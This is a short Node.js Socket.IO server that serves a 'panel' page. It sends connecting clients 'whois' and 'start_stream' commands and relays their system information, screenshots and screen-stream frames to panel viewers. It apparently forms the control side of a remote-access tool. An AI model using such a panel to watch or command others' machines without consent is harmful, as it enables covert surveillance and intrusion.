"use strict"

// --------------- INCLUDES ---------------
const app = require('express')();
const http = require('http').Server(app);
const io = require('socket.io')(http);
const port = process.env.PORT || 3000;
const fs = require("fs")

// --------------- PANEL ROUTES ---------------
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/panel/index.html');
});

// --------------- SOCKIO CONNECTION ---------------
io.on('connection', (socket) => {
    let systemInformation = null
    console.log(socket)
    console.log("---------------- New connection ----------------")

    socket.on("system", (options) => {
        systemInformation = options
        console.log(systemInformation)

        // TESTING
        socket.emit("command", { event: "start_stream" })
    })

    socket.on("error", (options) => {
        console.log("Error: ", options)
        socket.to("/panel").emit("error", options)
    })

    socket.on("screenshot", (imageBuffer) => {
        // SEND TO PANEL USERS
        socket.to("/panel").emit('screenshot', imageBuffer.toString("base64"));
    })

    socket.on("frame", (imageBuffer) => {
        // SEND TO PANEL USERS
        socket.to("/panel/stream").emit('frame', imageBuffer.toString("base64"));
    })

    // START COMMAND
    socket.emit("command", { event: "whois" })
});

// --------------- START SERVER ---------------
http.listen(port, () => {
    console.log(`Socket.IO server running at http://localhost:${port}/`);
});